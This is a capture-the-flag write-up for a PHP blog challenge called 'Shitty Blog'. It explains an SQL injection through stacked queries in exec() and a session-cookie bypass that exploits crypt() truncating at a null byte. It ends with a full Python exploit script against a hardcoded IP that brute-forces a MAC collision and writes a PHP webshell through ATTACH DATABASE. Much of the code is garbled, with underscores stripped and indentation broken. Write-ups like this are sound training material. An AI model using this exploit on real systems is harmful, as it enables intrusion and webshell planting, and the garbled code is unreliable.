Shitty Blog
{% file src="../.gitbook/assets/shitty blog ðŸ¤Ž-a6c0b8b672817005.tar.xz" %}
We could see that when inserting entries, the user_id is not validated. This is also directly substituted into the SQL query, allowing an SQL injection.
Interestingly, get_user uses $db->query, while delete_entry uses $db->exec. The exec() function allows multiline (stacked) queries, allowing us to use this RCE payload to upload a webshell.
```php
function getuser($db, $userid) : string {
    foreach($db->query("SELECT name FROM user WHERE id = {$user_id}") as $user) {
        return $user['name'];
    }
    return 'me';
}
...
function deleteentry($db, $entryid, $userid) {
    $db->exec("DELETE from entry WHERE {$userid} <> 0 AND id = {$entry_id}");
}
...
if(isset($POST['content'])) {
    insertentry($db, htmlspecialchars($_POST['content']), $id);
header('Location: /');
exit;

}
$entries = get_entries($db);
if(isset($POST['delete'])) {
    foreach($entries as $key => $entry) {
        if($POST['delete'] === $entry['id']){
            deleteentry($db, $entry['id'], $entry['userid']);
            break;
        }
    }
header('Location: /');
exit;

}
```
The difficulty lies in bypassing the following validation to insert a custom $id from the session cookie.
```php
$secret = 'SECRETPLACEHOLDER';
$salt = '$6$'.substr(hashhmac('md5', $SERVER['REMOTEADDR'], $secret), 16).'$';
if(! isset($COOKIE['session'])){
    $id = randomint(1, PHPINTMAX);
    $mac = substr(crypt(hashhmac('md5', $id, $secret, true), $salt), 20);
}
else {
    $session = explode('|', $COOKIE['session']);
    if( ! hashequals(crypt(hashhmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])) {
        exit();
    }
    $id = $session[0];
    $mac = $session[1];
}
```
Notice that in hash_hmac(), binary=true is set but crypt() is not binary safe - the function only processes the input string up to a null byte terminator!
It would therefore be trivial to find two $id numbers that produce the same $mac by bruteforcing - this happens when hash_hmac() returns a result starting with \x00.
```python
def findcollision():
    """
    Find an instance where two IDs produce '\x00' at the beginning of the hashhmac() output,
    resulting in crypt(), which is a non binary safe function, returning the same value.
Returns the MAC that corresponds to this result.
"""
results = {}

while True:
    r = requests.get(URL)
    cookie = r.headers['Set-Cookie'].split('=')[1]
    cookie = urllib.parse.unquote(cookie)

    id, mac = cookie.split('|')
    print(id, mac)

    if mac in results:
        return mac

    results[mac] = id

```
Since this $mac corresponds to the case where hash_hmac() returns a result starting with \x00, we would be able to bypass the following validation by using this $mac value in our session cookie, while changing the $id value in our session cookie until its HMAC starts with \x00.
php
hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt), $salt.$session[1])

This can be done by appending different things to the end of the payload (after an SQL comment) until we get a valid value. This value will produce a crypt() result corresponding to the $mac found previously.
```python
def findexploitcollision(exploit, mac):
    """
    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
    the hashhmac() output begins with '\x00'.
    """
    i = 0
    exploit = urllib.parse.quoteplus(exploit).replace('+', ' ')
    while True:
    print(i)

    tmp = exploit + str(i)

    # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
    r = requests.get(URL, cookies={'session': tmp + '|' + mac})
    if "My shitty Blog" in r.text:
        return tmp

    i += 1

```
The full script to generate the exploit payload is as follows:
```python
import requests
import urllib.parse
URL = "http://65.108.176.96:8888/"
def findcollision():
    """
    Find an instance where two IDs produce '\x00' at the beginning of the hashhmac() output,
    resulting in crypt(), which is a non binary safe function, returning the same value.
Returns the MAC that corresponds to this result.
"""
results = {}

while True:
    r = requests.get(URL)
    cookie = r.headers['Set-Cookie'].split('=')[1]
    cookie = urllib.parse.unquote(cookie)

    id, mac = cookie.split('|')
    print(id, mac)

    if mac in results:
        return mac

    results[mac] = id

def findexploitcollision(exploit, mac):
    """
    Finds a collision with the exploit user ID string. Appends stuff to the back of the string until
    the hashhmac() output begins with '\x00'.
    """
    i = 0
    exploit = urllib.parse.quoteplus(exploit).replace('+', ' ')
    while True:
    print(i)

    tmp = exploit + str(i)

    # Test if the hash_hmac() output begins with '\x00' (if it does, then the MAC is valid)
    r = requests.get(URL, cookies={'session': tmp + '|' + mac})
    if "My shitty Blog" in r.text:
        return tmp

    i += 1

mac = find_collision()
mac = "QAhL.MoHxwRM3Bt/pMvSrjxnRCAxaim7VAtMVwCnNgsjtlWO3AKBcd1WY9NYPrxtUrTluTorPK4laJKcJydWB0"
print(f"Found MAC: {mac}")
exploit = findexploitcollision("20 or 1=1; ATTACH DATABASE '/var/www/html/data/nice.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('');#", mac)
print(f"Found exploit: {exploit}")
print(f"Set session cookie: {exploit}|{mac}")
```
